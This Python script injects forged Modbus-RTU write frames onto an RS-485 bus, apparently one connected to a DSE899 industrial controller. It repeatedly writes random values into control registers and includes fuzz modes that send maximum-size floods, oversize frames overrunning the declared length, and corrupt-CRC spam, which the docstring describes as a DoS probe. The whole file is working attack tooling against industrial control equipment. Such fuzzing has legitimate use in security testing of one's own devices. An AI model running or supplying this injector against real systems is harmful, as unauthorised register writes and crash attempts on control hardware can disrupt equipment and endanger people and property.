#!/usr/bin/env python3
"""
modbus_write_injector.py
────────────────────────
Actively sends Modbus-RTU Write-Multiple-Registers (0x10) frames
at 115 200 bps, 8-N-2 onto the DSE899 RS-485 bus.

Default pattern:
  • slave-id 1
  • start-register 0x0051
  • quantity 1
  • payload = random 16-bit value
  • interval 1 s

Fuzz modes:
  --wide   send 125 registers (max legal = 250 bytes)
  --huge   claims 250 registers but actually ships 600 bytes
  --badcrc zeroes the CRC (corrupt)

Examples
────────
# Every second write one random value into 0x0051
python modbus_write_injector.py

# Hammer 125 registers starting at 0x0051 ten times a second
python modbus_write_injector.py --wide --rate 0.1

# Oversize (600 B) frame every 2 s
python modbus_write_injector.py --huge --rate 2

# Corrupt-CRC spam — watchdog / DoS probe
python modbus_write_injector.py --badcrc

"""

import argparse, os, random, struct, sys, time
import serial

PORT      = "/dev/cu.usbserial-BG018ZD3"   # adjust if necessary
BAUD      = 115_200
BYTESIZE  = serial.EIGHTBITS
PARITY    = serial.PARITY_NONE
STOPBITS  = serial.STOPBITS_TWO            # 8-N-2

# ────── CRC-16 / Modbus helper ────────────────────────────
def crc16(data: bytes) -> int:
    crc = 0xFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA001 if crc & 1 else crc >> 1
    return crc & 0xFFFF

def le_crc(data: bytes) -> bytes:
    return struct.pack("<H", crc16(data))

# ────── frame builders ────────────────────────────────────
def build_write16(slave: int, reg: int, value: int) -> bytes:
    body = struct.pack(">B B H H B H",
                       slave, 0x10, reg, 1, 2, value & 0xFFFF)
    return body + le_crc(body)

def build_wide(slave: int, start: int, qty: int = 125) -> bytes:
    """Legal maximum: 125 registers (250 bytes)"""
    payload = bytes(random.getrandbits(8) for _ in range(qty*2))
    body = struct.pack(">B B H H B", slave, 0x10, start, qty, qty*2) + payload
    return body + le_crc(body)

def build_huge(slave: int, start: int, claim: int = 250,
               actual_bytes: int = 600) -> bytes:
    """ByteCount 0xFA (250 reg) but ship far more."""
    payload = bytes(random.getrandbits(8) for _ in range(actual_bytes))
    body = struct.pack(">B B H H B", slave, 0x10, start, claim, claim*2) + payload
    return body + le_crc(body)

def build_badcrc(slave: int, reg: int) -> bytes:
    f = build_write16(slave, reg, random.randint(0, 0xFFFF))
    return f[:-2] + b"\x00\x00"     # zero CRC

# ────── CLI / main ────────────────────────────────────────
def parse():
    p = argparse.ArgumentParser()
    p.add_argument("--port", default=PORT)
    p.add_argument("--rate", type=float, default=1.0,
                   help="seconds between frames (default 1)")
    p.add_argument("--slave", type=lambda x:int(x,0), default=1)
    p.add_argument("--reg",   type=lambda x:int(x,0), default=0x51)
    g = p.add_mutually_exclusive_group()
    g.add_argument("--wide",  action="store_true", help="125-reg legal max")
    g.add_argument("--huge",  action="store_true", help="claim 250 reg, send 600 B")
    g.add_argument("--badcrc",action="store_true", help="zero CRC")
    return p.parse_args()

def main():
    opt   = parse()
    ser   = serial.Serial(opt.port, BAUD, BYTESIZE, PARITY, STOPBITS)
    print(f"[+] TX on {ser.port} 115200-8N2; frame every {opt.rate}s")

    while True:
        if opt.wide:
            frame = build_wide(opt.slave, opt.reg)
        elif opt.huge:
            frame = build_huge(opt.slave, opt.reg)
        elif opt.badcrc:
            frame = build_badcrc(opt.slave, opt.reg)
        else:
            frame = build_write16(opt.slave, opt.reg, random.randint(0, 0xFFFF))

        ser.write(frame)
        print(f"→ {frame.hex(' ')}  ({len(frame)} B)")
        time.sleep(opt.rate)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[+] stopped")
